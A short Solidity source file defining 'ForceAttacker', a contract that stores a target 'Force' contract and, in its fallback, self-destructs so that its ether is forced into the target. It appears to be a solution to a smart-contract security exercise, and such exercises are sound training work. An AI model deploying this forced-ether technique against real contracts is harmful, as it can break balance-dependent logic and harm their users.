// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "./Force.sol";

contract ForceAttacker {
    Force public force;

    constructor(Force _force) public payable {
        force = _force;
    }

    function balanceOfForce() public view returns(uint256) {
        return address(force).balance;
    }

    fallback() external {
        address payable forceAddress = payable(address(force));
        selfdestruct(forceAddress);
    }
}
